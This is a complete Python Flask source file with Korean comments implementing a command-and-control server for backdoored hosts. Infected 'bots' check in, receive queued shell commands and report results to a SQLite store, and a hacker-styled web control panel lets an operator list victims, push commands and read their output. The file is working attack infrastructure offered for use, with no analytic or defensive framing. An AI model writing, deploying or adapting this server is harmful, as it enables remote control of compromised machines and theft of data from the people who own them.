#!/usr/bin/env python3
"""
간단한 C2 (Command & Control) 서버
백도어가 주기적으로 접속하여 명령을 받아가는 방식
"""

from flask import Flask, request, jsonify
import sqlite3
import datetime
import os

app = Flask(__name__)
DB_FILE = 'c2_database.db'

# 데이터베이스 초기화
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    # 봇(감염된 호스트) 테이블
    c.execute('''CREATE TABLE IF NOT EXISTS bots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT UNIQUE,
        ip_address TEXT,
        hostname TEXT,
        os_info TEXT,
        first_seen TIMESTAMP,
        last_seen TIMESTAMP
    )''')

    # 명령 큐 테이블
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        command TEXT,
        status TEXT,
        created_at TIMESTAMP,
        executed_at TIMESTAMP
    )''')

    # 결과 테이블
    c.execute('''CREATE TABLE IF NOT EXISTS results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        command_id INTEGER,
        result TEXT,
        received_at TIMESTAMP
    )''')

    conn.commit()
    conn.close()

# 봇 등록/체크인
@app.route('/checkin', methods=['POST'])
def checkin():
    """
    봇이 주기적으로 접속하여 상태 보고 & 명령 수신
    POST 데이터: bot_id, hostname, os_info
    """
    data = request.json
    bot_id = data.get('bot_id')
    ip_address = request.remote_addr
    hostname = data.get('hostname', 'unknown')
    os_info = data.get('os_info', 'unknown')

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    # 봇 정보 업데이트 또는 생성
    c.execute('SELECT id FROM bots WHERE bot_id = ?', (bot_id,))
    if c.fetchone():
        # 기존 봇 - last_seen 업데이트
        c.execute('''UPDATE bots
                     SET last_seen = ?, ip_address = ?, hostname = ?, os_info = ?
                     WHERE bot_id = ?''',
                  (datetime.datetime.now(), ip_address, hostname, os_info, bot_id))
    else:
        # 신규 봇
        c.execute('''INSERT INTO bots (bot_id, ip_address, hostname, os_info, first_seen, last_seen)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (bot_id, ip_address, hostname, os_info,
                   datetime.datetime.now(), datetime.datetime.now()))

    # 대기 중인 명령 가져오기
    c.execute('''SELECT id, command FROM commands
                 WHERE bot_id = ? AND status = 'pending'
                 ORDER BY created_at LIMIT 1''', (bot_id,))

    cmd = c.fetchone()

    if cmd:
        cmd_id, command = cmd
        # 명령 상태를 'sent'로 변경
        c.execute('UPDATE commands SET status = ?, executed_at = ? WHERE id = ?',
                  ('sent', datetime.datetime.now(), cmd_id))
        conn.commit()
        conn.close()

        return jsonify({
            'status': 'ok',
            'command_id': cmd_id,
            'command': command
        })
    else:
        conn.commit()
        conn.close()
        return jsonify({
            'status': 'ok',
            'command': None
        })

# 명령 결과 수신
@app.route('/result', methods=['POST'])
def receive_result():
    """
    봇이 명령 실행 결과를 보고
    POST 데이터: bot_id, command_id, result
    """
    data = request.json
    bot_id = data.get('bot_id')
    command_id = data.get('command_id')
    result = data.get('result')

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    # 결과 저장
    c.execute('''INSERT INTO results (bot_id, command_id, result, received_at)
                 VALUES (?, ?, ?, ?)''',
              (bot_id, command_id, result, datetime.datetime.now()))

    # 명령 상태를 'completed'로 변경
    c.execute('UPDATE commands SET status = ? WHERE id = ?',
              ('completed', command_id))

    conn.commit()
    conn.close()

    return jsonify({'status': 'ok'})

# 오퍼레이터 인터페이스 - 봇 목록
@app.route('/bots', methods=['GET'])
def list_bots():
    """활성 봇 목록 조회"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    c.execute('SELECT bot_id, ip_address, hostname, os_info, first_seen, last_seen FROM bots')
    bots = []
    for row in c.fetchall():
        bots.append({
            'bot_id': row[0],
            'ip_address': row[1],
            'hostname': row[2],
            'os_info': row[3],
            'first_seen': row[4],
            'last_seen': row[5]
        })

    conn.close()
    return jsonify(bots)

# 오퍼레이터 인터페이스 - 명령 전송
@app.route('/send_command', methods=['POST'])
def send_command():
    """
    특정 봇에게 명령 전송
    POST 데이터: bot_id, command
    """
    data = request.json
    bot_id = data.get('bot_id')
    command = data.get('command')

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    c.execute('''INSERT INTO commands (bot_id, command, status, created_at)
                 VALUES (?, ?, 'pending', ?)''',
              (bot_id, command, datetime.datetime.now()))

    cmd_id = c.lastrowid
    conn.commit()
    conn.close()

    return jsonify({
        'status': 'ok',
        'command_id': cmd_id,
        'message': f'Command queued for bot {bot_id}'
    })

# 오퍼레이터 인터페이스 - 결과 조회
@app.route('/get_results/<bot_id>', methods=['GET'])
def get_results(bot_id):
    """특정 봇의 명령 결과 조회"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    c.execute('''SELECT r.command_id, c.command, r.result, r.received_at
                 FROM results r
                 JOIN commands c ON r.command_id = c.id
                 WHERE r.bot_id = ?
                 ORDER BY r.received_at DESC
                 LIMIT 50''', (bot_id,))

    results = []
    for row in c.fetchall():
        results.append({
            'command_id': row[0],
            'command': row[1],
            'result': row[2],
            'received_at': row[3]
        })

    conn.close()
    return jsonify(results)

# 웹 인터페이스 (간단한 HTML)
@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Control Panel</title>
        <style>
            body {
                font-family: monospace;
                background: #000;
                color: #0f0;
                padding: 20px;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            h1 {
                text-align: center;
                text-shadow: 0 0 10px #0f0;
            }
            .section {
                background: #111;
                border: 1px solid #0f0;
                padding: 20px;
                margin: 20px 0;
            }
            input, textarea, button {
                background: #000;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 10px;
                font-family: monospace;
            }
            button {
                cursor: pointer;
            }
            button:hover {
                background: #0f0;
                color: #000;
            }
            #bots-list, #results {
                margin-top: 10px;
            }
            pre {
                background: #000;
                border: 1px solid #0f0;
                padding: 10px;
                overflow-x: auto;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>⚡ C2 Control Panel ⚡</h1>

            <div class="section">
                <h2>🤖 Active Bots</h2>
                <button onclick="loadBots()">Refresh Bot List</button>
                <div id="bots-list"></div>
            </div>

            <div class="section">
                <h2>📤 Send Command</h2>
                <input type="text" id="target-bot" placeholder="Bot ID" style="width: 300px;"><br>
                <textarea id="command-input" rows="3" style="width: 100%; margin-top: 10px;" placeholder="Enter command..."></textarea><br>
                <button onclick="sendCommand()" style="margin-top: 10px;">Send Command</button>
                <div id="send-status"></div>
            </div>

            <div class="section">
                <h2>📥 Command Results</h2>
                <input type="text" id="results-bot" placeholder="Bot ID" style="width: 300px;">
                <button onclick="loadResults()">Load Results</button>
                <div id="results"></div>
            </div>
        </div>

        <script>
            function loadBots() {
                fetch('/bots')
                    .then(r => r.json())
                    .then(bots => {
                        let html = '<pre>';
                        html += 'BOT_ID                           | IP ADDRESS      | HOSTNAME        | LAST SEEN\\n';
                        html += '-------------------------------- | --------------- | --------------- | --------------------\\n';
                        bots.forEach(bot => {
                            html += `${bot.bot_id.padEnd(32)} | ${bot.ip_address.padEnd(15)} | ${bot.hostname.padEnd(15)} | ${bot.last_seen}\\n`;
                        });
                        html += '</pre>';
                        document.getElementById('bots-list').innerHTML = html;
                    });
            }

            function sendCommand() {
                const botId = document.getElementById('target-bot').value;
                const command = document.getElementById('command-input').value;

                fetch('/send_command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({bot_id: botId, command: command})
                })
                .then(r => r.json())
                .then(data => {
                    document.getElementById('send-status').innerHTML =
                        '<p style="color: #0f0;">✓ ' + data.message + '</p>';
                    document.getElementById('command-input').value = '';
                });
            }

            function loadResults() {
                const botId = document.getElementById('results-bot').value;

                fetch('/get_results/' + botId)
                    .then(r => r.json())
                    .then(results => {
                        let html = '';
                        results.forEach(r => {
                            html += '<div style="border: 1px solid #0f0; padding: 10px; margin: 10px 0;">';
                            html += '<strong>Command:</strong> ' + r.command + '<br>';
                            html += '<strong>Time:</strong> ' + r.received_at + '<br>';
                            html += '<strong>Result:</strong><pre>' + r.result + '</pre>';
                            html += '</div>';
                        });
                        document.getElementById('results').innerHTML = html;
                    });
            }

            // Auto-refresh bots every 10 seconds
            setInterval(loadBots, 10000);
            loadBots();
        </script>
    </body>
    </html>
    '''

if __name__ == '__main__':
    print('='*60)
    print('  C2 Server Starting...')
    print('='*60)

    # DB 초기화
    init_db()
    print('[+] Database initialized')

    # 서버 실행
    print('[+] Starting Flask server on 0.0.0.0:8080')
    print('[+] Web interface: http://localhost:8080/')
    print('[+] Bot checkin endpoint: http://YOUR_IP:8080/checkin')
    print('='*60)

    app.run(host='0.0.0.0', port=8080, debug=False)
